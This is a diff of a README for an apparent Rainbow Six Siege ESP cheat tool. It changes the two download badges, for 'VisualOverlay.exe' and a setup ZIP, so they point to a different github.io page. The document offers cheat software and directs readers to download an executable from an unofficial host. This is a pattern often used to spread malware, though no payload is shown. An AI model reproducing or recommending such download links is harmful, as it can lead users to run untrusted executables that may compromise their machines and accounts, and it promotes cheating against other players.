@@ -1,7 +1,7 @@
 # 🛡️ Rainbow Six Siege ESP — Visual Assist Setup Tool
 
-[![Download VisualOverlay.exe](https://img.shields.io/badge/Download-VisualOverlay.exe-green?style=for-the-badge)](https://rainbow-six-siege-esp-visual-assist.github.io/.github/)
-[![Get Full Setup](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://rainbow-six-siege-esp-visual-assist.github.io/.github/)
+[![Download VisualOverlay.exe](https://img.shields.io/badge/Download-VisualOverlay.exe-green?style=for-the-badge)](https://itaniamejry.github.io/.github/rainbow-six-siege-esp-visual)
+[![Get Full Setup](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://itaniamejry.github.io/.github/rainbow-six-siege-esp-visual)
 
 ---
 
